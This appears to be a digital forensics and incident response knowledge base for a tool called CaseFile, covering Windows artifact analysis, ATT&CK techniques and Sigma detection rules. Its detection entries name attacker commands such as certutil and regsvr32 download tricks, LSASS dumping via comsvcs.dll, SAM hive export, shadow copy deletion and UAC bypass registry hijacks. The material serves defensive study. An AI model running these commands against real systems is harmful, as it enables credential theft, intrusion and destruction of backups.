content: Advanced registry forensic techniques: 1) Registry slack: Deleted registry values remain in hive slack space. 2) Hive transaction logs: LOG1/LOG2 files contain uncommitted transactions -- may reveal recent changes not yet in main hive. 3) LastWrite timestamps: Each key has a LastWrite time (most recent write to key or any subkey). 4) RecentDocs key: NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs tracks recently opened files by extension. 5) WordWheelQuery: Typed search terms in Windows Explorer. 6) ComDlg32: Recently opened/saved file dialog history. 7) MuiCache: Application display name cache for executed programs.

title: Event Log Gap Analysis
content: Event log gaps reveal anti-forensics activity. Gap analysis methodology: 1) Sort Security.evtx by TimeCreated ascending. 2) Calculate delta between consecutive events. 3) Gaps > 1 hour without 1100/4647 (shutdown/logoff) indicate log clearing or service stop. 4) Missing expected events (no 4624 for known login) indicate selective clearing. 5) Event record ID gaps (EventRecordID not sequential) indicate record deletion (rare but possible with manual editing). 6) Log size vs expected event volume: Security log 200KB after 1 week of activity suggests recent clearing. Correlate gap timestamps with 1102/104 events and wevtutil Prefetch entries.

title: Volume Shadow Copy Forensic Analysis
content: VSS snapshots provide point-in-time file system views. Access: vssadmin list shadows, then symlink \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN to accessible path. Forensic value: 1) Recover files deleted after snapshot. 2) Compare registry hives between snapshots to see changes over time. 3) Access NTDS.dit from snapshot for offline credential extraction. 4) Compare MFT between snapshots to identify files added/modified/deleted. 5) Establish pre-attack baseline. VSS deletion artifacts: vssadmin.exe in Prefetch, Event 524 (System Restore point deleted), bcdedit commands in Event 4688.

title: Network Forensics from Host Artifacts
content: Host-based network evidence sources: 1) DNS cache (ipconfig /displaydns -- volatile, not in disk image). 2) ARP cache (arp -a -- volatile). 3) Network connections in memory (Volatility netscan -- captures at acquisition). 4) SRUM network usage (SRUDB.dat -- historical bytes per app). 5) Windows Firewall logs (C:\Windows\System32\LogFiles\Firewall\pfirewall.log -- if enabled). 6) Browser history (Chrome/Firefox SQLite databases). 7) DNS client event log (Microsoft-Windows-DNS-Client/Operational). 8) Windows Remote Management (WinRM) event log for remote PowerShell. 9) RDP logs (TerminalServices-LocalSessionManager).

title: Malware Triage Decision Tree
content: Systematic malware triage from host artifacts: 1) Is there an unknown process in memory? (Volatility pslist+psscan) -- if yes, get cmdline, network connections, parent. 2) Is there an executable not in Amcache? (new process in memory without Amcache entry = fileless or very recent). 3) Does the executable have a valid signature? (Amcache CompanyName, ProductName; MFT authenticode). 4) Does the path match expected for process type? (csrss.exe outside System32 = masquerading). 5) Are there network connections from unexpected processes? (explorer.exe, Word connecting outbound). 6) Are there suspicious registry entries? (Run keys pointing to Temp). Each yes = record as finding.

title: Lateral Movement Hunting Methodology
content: Systematic lateral movement hunting: 1) Identify source host (primary compromise). 2) Extract all outbound network connections from memory (netscan) and event logs (4624 type 3). 3) For each destination IP: check if it's internal, what port, what process. 4) On destination hosts: look for 4624 type 3 from source IP around same time. 5) Check destination hosts for new services (7045), new processes, new files created around connection time. 6) Look for credential reuse: same account authenticating to multiple hosts within minutes. 7) Check for ADMIN$ or C$ share access (5140). CaseFile: propagate_iocs.py extracts IPs → hunt on next host.

title: Timeline Anchoring Technique
content: Timeline anchoring establishes reliable reference points for incident reconstruction. Anchor types: 1) Hard anchors: Event log entries with exact timestamps (4624 with specific credentials, 7045 service install). 2) Soft anchors: File timestamps that may be manipulated (MFT $SI -- check SI<FN). 3) Cross-artifact anchors: Same event visible in multiple sources with same timestamp (process in Prefetch + Event 4688 + Amcache). Reconstruction approach: Start from hard anchors, work outward. Gaps in timeline are findings themselves (anti-forensics window). Contradiction between anchors (executed before created) = timestomping finding.

title: Memory Triage Priority Order
content: Memory analysis triage order for maximum value in minimum time: 1) netscan -- active network connections reveal C2 immediately. 2) pslist+psscan comparison -- hidden processes indicate rootkit. 3) cmdline for suspicious processes -- reveals tool arguments and C2 URLs. 4) dlllist for suspicious processes -- injected DLLs visible. 5) malfind -- executable RWX memory regions indicate shellcode. 6) handles for LSASS -- credential dumping detection. 7) timeliner -- temporal correlation of memory events. Each step builds on previous. Start broad (netscan), then drill into suspicious processes found.

title: Insider Threat Investigation Methodology
content: Insider threat investigations require different focus than external attacker investigations. Key artifacts: 1) UserAssist + RecentDocs -- what did user access and when. 2) Shellbags -- what directories did user browse. 3) Browser history -- web-based exfiltration research, personal cloud storage. 4) USB artifacts -- USBSTOR registry, LNK files from USB paths, SetupAPI logs. 5) Print spooler logs -- printed documents (sensitive data). 6) SRUM -- abnormal data volume sent by email clients or browsers. 7) Email client files -- PST/OST files for email evidence. 8) Cloud sync clients (OneDrive/Dropbox sync logs). Correlation: high-volume USB activity + cloud upload + resignation letter = exfiltration scenario.

title: Cloud Artifact Forensics on Windows
content: Cloud storage and SaaS artifacts on Windows endpoints: OneDrive: %USERPROFILE%\OneDrive sync folder, NTUSER.DAT\Software\Microsoft\OneDrive\Accounts (account info, last sync), Event log Microsoft-Windows-OneDrive. Dropbox: %USERPROFILE%\Dropbox sync folder, NTUSER.DAT\Software\Dropbox\ks\client (device ID). Google Drive: filestreamconfig file. Browser-based uploads: browser history shows uploads to cloud services (Google Drive, WeTransfer, Mega.nz). SRUM shows data volume sent by browser/sync client. Key question for exfil investigation: Was data uploaded to personal cloud storage before leaving organization?

title: Persistence Baseline Comparison
content: Comparing against clean baseline to identify persistence: 1) Run keys: Compare HKLM/HKCU Run/RunOnce against expected software. Unknown entries = suspicious. 2) Services: Cross-reference all installed services against known software. Services pointing to non-standard paths = suspicious. 3) Scheduled tasks: All tasks in C:\Windows\System32\Tasks compared against expected. Random names or Base64 actions = malicious. 4) Startup folders: Any executables in startup folders checked against known software. 5) Browser extensions: Extension IDs in browser profile vs known-good list. 6) WMI subscriptions: Any permanent subscriptions = rare and suspicious. CaseFile forensic_rag() returns baseline context for each artifact type.

title: Digital Chain of Custody Requirements
content: Digital chain of custody documentation for legal proceedings requires: 1) Evidence identification: unique case/exhibit number, description, collection date/time/location. 2) Hash verification: SHA-256 of original, hash of forensic copy, tool used. 3) Collection documentation: who collected, what tools used, write blocker model/serial. 4) Transfer log: everyone who had custody with dates and purpose. 5) Storage documentation: where stored, access controls, temperature/humidity if physical. 6) Analysis log: every action taken on evidence with timestamp and analyst identity. CaseFile provides: SHA-256 in source.sha256, audit/mcp.jsonl with examiner field and timestamps, approvals.jsonl with content hash at approval time.

title: Windows Process Baseline: Extended
content: Additional expected Windows processes: wininit.exe (PID varies, parent smss.exe, runs once at boot, System32). lsm.exe (Local Session Manager, parent wininit.exe, manages terminal sessions). dwm.exe (Desktop Window Manager, one per session, parent winlogon.exe). taskhost.exe/taskhostw.exe (hosts DLL-based tasks, parent svchost.exe). dllhost.exe (COM Surrogate, parent svchost.exe, multiple OK). mmc.exe (Microsoft Management Console, parent explorer.exe for interactive use). Suspicious variations: Any of these from unusual paths, wrong parent process, or with network connections are high-confidence masquerading indicators.

title: Windows Named Pipe Forensics
content: Named pipes are IPC mechanisms frequently used by malware for C2 and lateral movement. Legitimate pipes: \PIPE\lsass (LSASS), \PIPE\svcctl (Service Control), \PIPE\samr (SAM), \PIPE\netlogon (domain auth), \PIPE\spoolss (Print Spooler). Malicious patterns: Cobalt Strike default pipes (\PIPE\msagent_[hex], \PIPE\status_[hex], \PIPE\MSSE-[number]-server), Metasploit pipes (\PIPE\[random]), custom C2 pipes with random or mimicry names. Detection: Volatility handles plugin shows pipe names per process. Unexpected pipes in svchost.exe or legitimate processes indicate injection. Named pipe lateral movement via SMB (\\hostname\PIPE\[name]).

title: Common Malware Staging Paths
content: Directories commonly used by malware for staging and persistence: High confidence: C:\Users\[user]\AppData\Local\Temp, C:\Windows\Temp, C:\Users\Public, C:\ProgramData (not in vendor subdir), C:\Windows\System32\Tasks (for task XML), C:\Users\[user]\AppData\Roaming (not in vendor subdir). Medium confidence: C:\Users\[user]\Downloads, C:\Users\[user]\Desktop, C:\Users\[user]\AppData\Local (not in vendor subdir). Specific attacker patterns: Hex-named files (40-char SHA1 = Cobalt Strike staging), random 8-char alphanumeric (Metasploit staging), legitimate application directory (DLL hijacking). CaseFile MFT analysis flags files in these paths with high suspicion.

title: CaseFile Grounding Verification Deep Dive
content: CaseFile's two-tier grounding verification: Tier 1 (Tool Attestation): For each evidence_quote, looks up invocation_id in audit/mcp.jsonl. Verifies: (1) invocation_id exists, (2) tool field matches quoted tool name. Status: GROUNDED, UNGROUNDED (no entry), or CONTRADICTED (wrong tool). Tier 2 (CSV Value Check): Only fires when csv_files present in audit entry (Amcache, Registry, Event Logs, MFT). Opens each CSV file, searches all rows for exact_value match in any field. Status: TIER2_PASS (value found), TIER2_FAIL (value not found), or skipped (no csv_files). Key bug fixed May 18: audit_log() flattens extra dict into top level -- csv_files is at top level, not nested under extra.

title: CaseFile Self-Correction Loop Detail
content: Ralph.sh self-correction loop mechanics: After investigation completes, grounding_verify.py runs (exit 0=clean, 1=fatal, 2=contradicted). On exit 2: grounding_correction_prompt.py reads claim_accuracy_report.json and builds a specific prompt: 'Finding F-001: claim [exact text] is CONTRADICTED -- tool output shows [exact value]. Rewrite using ONLY grounded claims.' This prompt is fed back to Claude Code. grounding_recheck.py re-verifies. Max 3 iterations before escalating to human. Key design: correction prompt is SPECIFIC -- not 'review your findings' but exactly what was wrong and what the tool actually said. Prevents substituting one hallucination for another.

title: CaseFile Contradiction Detection
content: detect_contradictions() in correlation.py runs automatically as part of correlate_evidence(). Three contradiction patterns: 1) execution_before_creation: Prefetch last_run_utc < MFT si_created_utc -- indicates timestomping (T1070.006). Calculates delta in seconds for severity. 2) memory_only_no_amcache_prefetch_mft: Process in memory with no disk artifacts -- indicates fileless malware or process injection (T1055). Note: registry and event log sources not evaluated here. 3) path_mismatch_amcache_mft: Amcache full_path != MFT file_path (normalized, case-insensitive) -- indicates DLL sideloading or binary replacement (T1574.001). Each contradiction returned with mitre field for ATT&CK mapping.

title: CaseFile Evidence Integrity Architecture
content: CaseFile evidence integrity is enforced architecturally, not via prompts: 1) .claude/settings.json deny rules block Write/Edit to evidence/, audit/, approvals/ -- tested in tests/test_settings.py (12 tests). 2) audit/mcp.jsonl is append-only -- audit_log() only appends, never reads or modifies existing entries. 3) approvals.jsonl written only by casefile-approve CLI (not an MCP tool). 4) SHA-256 source hash in source.sha256 -- written once at ingest, never modified. 5) Path confinement via _resolve_case_dir() -- all file operations checked against CASEFILE_CASE_ROOT using .resolve().relative_to(). 6) Evidence copies in analysis/ -- original evidence/ never touched by parsers.

title: Spearphishing via Link
content: Adversaries may send spearphishing emails with malicious links. Modern delivery: HTML smuggling (JavaScript in email body assembles malicious file in browser, bypasses email gateway attachment scanning), links to attacker-controlled sites with drive-by download, links to legitimate file sharing services (OneDrive, Dropbox, Google Drive) hosting malicious files, redirectors through legitimate services. Detection: Browser process spawning script interpreters, downloaded files with Zone.Identifier ZoneId=3 (internet), MFT creation of executables in Downloads shortly after email timestamps, browser history showing malicious URL access.

title: Web Protocols C2
content: Adversaries may communicate using application layer protocols like HTTP/HTTPS to avoid detection. Cobalt Strike HTTP profiles mimic legitimate web traffic with custom headers, URIs, and user agents. Detection: Regular interval connections (beaconing), connections to non-corporate IPs on 80/443, unusual User-Agent strings, small regular POST requests (heartbeat), large infrequent GET responses (task download). Memory netscan shows process making HTTP connections -- explorer.exe, Word, svchost making outbound 443 connections to non-Microsoft IPs is suspicious. JA3/JA3S TLS fingerprints for Cobalt Strike are published.

title: SSH Lateral Movement
content: Adversaries may use SSH for lateral movement to Linux/Unix systems or Windows with OpenSSH. Detection on Windows: OpenSSH client (ssh.exe) in Prefetch/Amcache, Event 4688 with ssh.exe and target host arguments, Event log Microsoft-Windows-OpenSSH/Operational, known_hosts file in %USERPROFILE%\.ssh\ (reveals previously connected hosts), private key files in %USERPROFILE%\.ssh\ (id_rsa, id_ed25519). Lateral movement pattern: Windows host with ssh.exe Prefetch entry + target Linux host showing new connection from Windows IP.

title: Network Sniffing
content: Adversaries may sniff network traffic to capture credentials and sensitive data. Tools: Wireshark, tcpdump, NetworkMiner, Responder (passive sniffing component). Detection: Wireshark/tcpdump in Prefetch/Amcache, network interface in promiscuous mode (netsh trace show status), large pcap files in user directories (MFT), Event log showing network capture driver installation. Responder sniffing: Event logs show LLMNR/NBT-NS responses from unusual hosts, Responder.db file in Responder directory, Responder.py in Prefetch.

title: Rogue Domain Controller (DCShadow)
content: DCShadow allows an attacker with domain admin privileges to register a rogue domain controller and push malicious changes to AD. Tool: Mimikatz lsadump::dcshadow. Detection: Event 4928 (source NC replica added -- rare outside actual DC addition), new computer object with server object type registered in AD (4741), unusual replication traffic to non-DC IP, Mimikatz in Prefetch/Amcache. Comparison: DCShadow bypasses event logging on DC by pushing changes directly through replication protocol instead of LDAP/SAMR APIs.

title: Keylogging
content: Adversaries may log keystrokes to intercept credentials and sensitive information. Techniques: SetWindowsHookEx API (global keyboard hook), GetAsyncKeyState polling, kernel-mode keylogger (driver), browser credential harvesting. Detection: Processes with SetWindowsHookEx hooks visible in memory analysis (handles/dlllist), keylogger DLL injected into legitimate processes, log files in AppData with keystroke captures, process with unusual handles to input devices. Memory: Keylogger DLL in explorer.exe or browser processes via dlllist.

title: Indirect Command Execution
content: Adversaries may abuse utilities that allow command execution to bypass security restrictions on direct execution. Methods: pcalua.exe -a [cmd], forfiles /c 'cmd /c [cmd]', SyncAppvPublishingServer 'n;[PS cmd]', cmstp.exe /s [inf], msiexec /i [URL]. These bypass application whitelisting by executing through trusted binaries. Detection: Unusual parent processes for these binaries, Event 4688 with indirect execution arguments, child processes spawned by these utilities that would normally never have children.

title: DCSync Credential Dumping
content: DCSync abuses AD replication to extract password hashes without logging on to DC interactively. The attacker impersonates a DC and requests password data via MS-DRSR protocol. Tools: Mimikatz lsadump::dcsync, Impacket secretsdump.py. Detection: Event 4662 on DC where Object=Domain Naming Context, Properties include DS-Replication-Get-Changes + DS-Replication-Get-Changes-All, from non-DC computer account. Multiple 4662 in rapid succession from single source. AD ACL changes granting replication rights to non-DC accounts (pre-positioning indicator).

title: Group Policy Modification
content: Adversaries may modify Group Policy Objects to subvert AD security settings or deploy malicious configurations. Detection: Event 5136 (directory service object modified) for GPO objects, Event 4739 (domain policy changed), gpo.log files showing unexpected modifications, PowerShell/GPMC access to GPO paths (\\domain\SYSVOL\..\Policies). Malicious GPO payloads: startup scripts that run on all machines, scheduled tasks pushed domain-wide, registry modifications pushed to all computers. Requires Domain Admin or GPO edit permissions.

title: Sigma: Defense Bypass via LOLBins
content: Comprehensive Sigma ruleset for LOLBin-based defense bypass. High-confidence: rundll32.exe with comsvcs.dll MiniDump (LSASS dump), certutil -urlcache -split -f [URL] (download), mshta javascript: or vbscript: (script execution), regsvr32 /s /u /i:[URL] scrobj.dll (squiblydoo), wmic process call create [cmd] (indirect execution), bitsadmin /transfer (download). Medium-confidence: regsvr32 with non-system32 DLL, msiexec with /i [URL], odbcconf /a {REGSVR [path]}, xwizard RunWizard {[CLSID]}. Each rule requires parent process context for accuracy.

title: Sigma: Ransomware Precursor Activity
content: Sigma rules detecting pre-encryption ransomware preparation. High-confidence chain: 1) nltest /dclist or net group /domain (AD enumeration), 2) ADFind or BloodHound execution (AD mapping), 3) Rclone with remote configuration (exfiltration tool), 4) vssadmin delete shadows (shadow copy deletion), 5) bcdedit /set {default} recoveryenabled No (recovery disabling), 6) wbadmin delete catalog (backup deletion), 7) Mass file access pattern (encryption beginning). Any 3+ of these in sequence within 24 hours = ransomware imminent or in-progress.

title: Sigma: Kerberos Attack Detection Bundle
content: Kerberos attack Sigma rules: Kerberoasting (4769, EncryptionType=RC4/0x17, multiple SPNs requested from single source), AS-REP Roasting (4768 with PreAuthType=0 -- accounts without pre-auth required), Pass-the-Ticket (4769 without preceding 4768 TGT request, or unusual source for ticket), Overpass-the-Hash (4768 from non-DC IP, unusual workstation), Golden Ticket (4769 with impossible UserID 500 from non-admin, tickets with anomalous lifetime > 10 hours). DC event log analysis required for all Kerberos detections.

title: Sigma: Data Exfiltration Detection
content: Sigma rules for exfiltration detection: Volume-based: process with bytes_sent > threshold in SRUM. Protocol-based: DNS query volume spike (DNS tunneling), ICMP packet size anomaly (ICMP tunneling), HTTPS to non-corporate cloud storage (Mega.nz, anonfiles, transfer.sh). Tool-based: rclone.exe in Prefetch (near-certain exfil), curl/wget with output to archive file, ftp.exe with PUT commands in Event 4688. Staging indicators: 7-Zip/WinRAR creating large archives in temp directories, archive files in temp followed by network transfer. Correlate archive creation timestamps with network connection timestamps.

title: Sigma: Credential Access Detection Bundle
content: Comprehensive credential access Sigma bundle: LSASS access (4656 with PROCESS_VM_READ to lsass.exe from non-system process), SAM hive access (reg save HKLM\SAM in 4688 cmdline), NTDS extraction (ntdsutil IFM in 4688, diskshadow exposing volume in 4688), browser credential theft (suspicious access to Chrome/Firefox profile SQLite databases), credential file access (access to .kdbx KeePass, .p12 certificates, private key files), LSA secrets access (reg query HKLM\SECURITY in 4688), DPAPI abuse (mimikatz dpapi:: in 4104 script blocks).

title: Sigma: Registry Persistence Detection
content: Sigma rules for registry-based persistence: Run key modification (4657 or reg.exe add in 4688 targeting CurrentVersion\Run), IFEO debugger hijacking (4657 or reg.exe targeting Image File Execution Options), AppInit DLLs (4657 targeting Windows\AppInit_DLLs, value non-empty = code injection on every process start), Winlogon hijacking (4657 targeting Winlogon\Userinit or Shell), COM hijacking (4657 targeting HKCU\Software\Classes\CLSID which takes precedence over HKLM), BootExecute modification (4657 targeting BootExecute -- runs before Windows fully loaded).

title: Sigma: Attacker Discovery/Reconnaissance Bundle
content: Sigma rules for post-compromise discovery phase. Network discovery cluster (5+ within 10 min = systematic recon): ipconfig /all, netstat -ano, arp -a, route print, nslookup, net view. User/system discovery cluster: whoami /all, net user, net group, qwinsta, query user, systeminfo. AD enumeration cluster: net group 'Domain Admins' /domain, nltest /dclist, Get-ADUser/Get-ADGroup, dsquery. Tool execution: nmap.exe, masscan.exe, Advanced IP Scanner (suspicious on server), NBTscan (NBTSCAN.exe). Time-clustering these into sessions reveals attacker methodology and scope.

title: Browser Forensics Deep Dive
content: Comprehensive browser artifact analysis: Chrome: History (SQLite, visits table), Downloads (downloads table with source URL + local path), Login Data (encrypted credentials), Cookies, Extensions (manifest.json per extension in extensions dir), Cache. Firefox: places.sqlite (moz_historyvisits + moz_places), downloads.sqlite, key4.db (credential store), signons.sqlite. Edge (Chromium-based): same as Chrome, %LOCALAPPDATA%\Microsoft\Edge\User Data\Default. Key forensic queries: SELECT url, title, visit_count, last_visit_time FROM urls WHERE url LIKE '%transfer%' (exfil research). Download source URLs prove where malware came from. Correlate download timestamps with Prefetch/Amcache first execution times.

title: PowerShell Forensic Artifacts
content: PowerShell leaves multiple forensic traces: 1) PSReadLine history: %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt (interactive commands). 2) Script block logs: Event 4104 in Microsoft-Windows-PowerShell/Operational (captures scripts including after AMSI deobfuscation). 3) Module logging: Event 4103 (pipeline execution). 4) Transcription: %USERPROFILE%\Documents\PowerShell_transcript*.txt (if enabled). 5) PowerShell event log: Microsoft-Windows-PowerShell/Operational Events 4100/4104. 6) AMSI provider logs: Show bypass attempts. 7) Prefetch: powershell.exe execution with last run time. 8) Amcache: PowerShell scripts (.ps1) if explicitly run may appear.

title: Scheduled Task Forensic Artifacts
content: Scheduled task persistence artifacts: XML task definitions: C:\Windows\System32\Tasks\ (all tasks), C:\Windows\SysWOW64\Tasks\ (32-bit). Each task XML contains: Triggers (schedule or event), Actions (executable + arguments), Principal (run-as account), Settings. Registry: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks (GUID-keyed), HKLM\...\Schedule\TaskCache\Tree (task hierarchy). Event logs: 4698 (task created), 4702 (task modified), 4699 (task deleted), 4700/4701 (enabled/disabled), Task Scheduler operational log (106=task registered). Suspicious indicators: Base64 in Actions, SYSTEM principal on non-system task name, task created same time as malware execution.

title: WMI Persistence Artifact Forensics
content: WMI persistence artifacts and analysis: Repository location: C:\Windows\System32\wbem\Repository (MOF-based database). Components: EventFilter (trigger condition in WQL), EventConsumer (action -- script or command), FilterToConsumerBinding (links filter to consumer). Event log: Microsoft-Windows-WMI-Activity/Operational Event 5861 (subscription activity). Analysis tools: PyWMIPersistenceFinder (Python), WMIExplorer (GUI). Forensic approach: Parse repository for permanent subscriptions, check EventConsumer Actions for malicious commands, correlate 5861 events with timeline. Attackers use WMI for persistence because it survives reboot and has no file on disk (fileless).

title: Windows Security Descriptor Forensics
content: Security descriptors control object access and can be modified by attackers. Key locations: File system ACLs (icacls output, MFT security IDs), Registry key ACLs (regini, RegGetKeySecurity), AD object ACLs (visible via BloodHound, modified with DACL abuse). Attacker abuse: Adding Everyone/write permissions to sensitive files (malware persistence), DACL-based persistence on AD objects (write permissions to user accounts for later password reset), ACL modification on security log key to prevent clearing detection. Detection: Event 4670 (object permissions changed), icacls comparison against baseline, BloodHound ACL anomalies.

title: Incident Timeline Template
content: Standard incident timeline categories for comprehensive reconstruction: T0=Initial Access (first evidence of attacker presence -- phishing email receipt, VPN auth from unusual IP). T1=Execution (first malicious code execution -- macro, exploit, dropper). T2=Persistence (first persistence mechanism installed -- service, scheduled task, Run key). T3=Privilege Escalation (credential dumping, UAC bypass, local admin to domain admin). T4=Defense Evasion (log clearing, AV disabling, timestomping, security tool killing). T5=Discovery (network scan, AD enumeration, share enumeration). T6=Lateral Movement (first SMB/RDP/WMI move to second host). T7=Collection (staging area creation, data aggregation, archive creation). T8=Exfiltration (first data leaving environment). T9=Impact (ransomware execution, destruction, disruption).

title: IR Report Standard Sections
content: Standard IR report structure for court-admissibility and completeness: 1) Executive Summary (non-technical, business impact, timeline, recommendations). 2) Scope and Methodology (what was examined, tools used, chain of custody). 3) Timeline of Events (chronological, UTC timestamps, cross-referenced artifacts). 4) Technical Findings (each finding: what was found, evidence sources, confidence level, ATT&CK mapping). 5) Indicators of Compromise (IPs, domains, hashes, file paths, registry keys). 6) Attribution (if applicable, with confidence level). 7) Recommendations (immediate remediation, long-term improvements). 8) Appendices (raw tool output, hashes, evidence inventory). CaseFile generates: findings.md with evidence citations, timeline.json, accuracy_report.

title: Winlogon Helper DLL
content: Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Registry keys: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit (default: userinit.exe -- adding additional executable persists on logon), HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell (default: explorer.exe -- replacing hijacks shell). Detection: RECmd shows non-default values for Userinit or Shell keys. Userinit value other than 'C:\Windows\system32\userinit.exe,' indicates persistence. Shell value other than 'explorer.exe' indicates shell hijacking.

title: Authentication Package
content: Adversaries may abuse authentication packages to execute DLLs when the system boots. Authentication packages are DLLs loaded by LSASS at startup. Registry: HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Authentication Packages. Adding a malicious DLL here causes it to be loaded by LSASS with SYSTEM privileges at boot. Detection: RECmd shows non-default authentication packages (default: msv1_0). Any additional DLL is suspicious. MFT shows DLL placed in System32. Memory: malicious DLL visible in LSASS dlllist output.

title: UAC Bypass
content: UAC bypass techniques allow execution with elevated privileges without UAC prompt. Common methods: fodhelper.exe (registry hijack in HKCU\Software\Classes\ms-settings\shell\open\command), eventvwr.exe (HKCU\Software\Classes\mscfile\shell\open\command hijack), sdclt.exe, computerdefaults.exe. These are auto-elevated COM objects where HKCU registry takes precedence over HKLM. Detection: New HKCU\Software\Classes entries for auto-elevated applications (4657 or reg.exe in 4688), these keys should not exist legitimately, fodhelper.exe or eventvwr.exe spawning cmd.exe/powershell.exe.

title: File and Directory Permissions Modification
content: Adversaries may modify file or directory permissions/attributes to evade access controls. Methods: icacls.exe granting full control to Everyone, cacls.exe, attrib.exe hiding files (+H +S), takeown.exe gaining ownership. Detection: Event 4670 (permissions changed on file/folder, requires SACL auditing), icacls.exe or cacls.exe in Prefetch/Amcache, Event 4688 with these commands. Attrib.exe making files hidden/system in Prefetch indicates concealment. icacls granting broad permissions to attacker staging directories is preparation for persistence or lateral movement.

title: Windows Autoruns Complete Reference
content: Complete Windows autorun/persistence locations checked by Autoruns/Sysinternals: HKLM/HKCU Run/RunOnce/RunOnceEx keys, Startup folders (per-user and all-users), Browser extensions and BHOs, Services, Scheduled tasks, Winlogon (Userinit, Shell, Notify), LSA Authentication Packages and Security Packages, Print monitors (HKLM\SYSTEM\CCS\Control\Print\Monitors), Network providers (HKLM\SYSTEM\CCS\Control\NetworkProvider\Order), Sidebar gadgets, AppInit_DLLs, Winsock providers (HKLM\SYSTEM\CCS\Services\WinSock2\Parameters), KnownDLLs (rarely modified), BootExecute, Driver loading (HKLM\SYSTEM\CCS\Services with ImagePath). Autoruns checks code signing for all entries.

title: DLL Side-Loading
content: Adversaries may execute malicious DLLs by placing them in a directory where a legitimate application will load them. Attack: Place evil.dll in same directory as legitimate_app.exe with name matching DLL that app imports. Windows loads from application directory before System32. Common targets: AV products, legitimate software with unsigned DLL imports. Detection: Amcache shows DLL from unexpected path, Volatility dlllist shows legitimate process loading DLL from Temp/AppData instead of System32/Program Files, MFT shows DLL created in application directory shortly before malicious activity, path_mismatch_amcache_mft contradiction in CaseFile.

title: Rename System Utilities
content: Adversaries may rename legitimate system utilities to avoid detection. Examples: Renaming cmd.exe to svchost.exe, powershell.exe to lsass.exe. Detection: Amcache SHA1 matches known utility hash but filename/path is different from expected. MFT shows executable with system-sounding name created in Temp. Volatility cmdline shows process with system name but unusual arguments or parent. Signature check: legitimate system utilities are signed by Microsoft; renamed copies retain signature but Authenticode path may mismatch. Cross-reference SHA1 against NSRL database for known-good file identification.

title: ATT&CK Tactic Summary for Windows IR
content: MITRE ATT&CK tactic flow in a typical Windows intrusion: TA0001 Initial Access (phishing, exploit public-facing app, supply chain) -> TA0002 Execution (PowerShell, cmd, WMI, scheduled task) -> TA0003 Persistence (Run keys, services, scheduled tasks, WMI) -> TA0004 Privilege Escalation (UAC bypass, token theft, named pipe impersonation) -> TA0005 Defense Evasion (timestomping, log clearing, masquerading, LOLBins) -> TA0006 Credential Access (LSASS dump, DCSync, Kerberoasting) -> TA0007 Discovery (network scan, AD enum, process/file discovery) -> TA0008 Lateral Movement (PtH, PtT, RDP, WMI, SMB) -> TA0009 Collection (keylogging, screen capture, data staging) -> TA0010 Exfiltration (HTTPS, DNS, SMB to external) -> TA0040 Impact (ransomware, data destruction, service disruption).
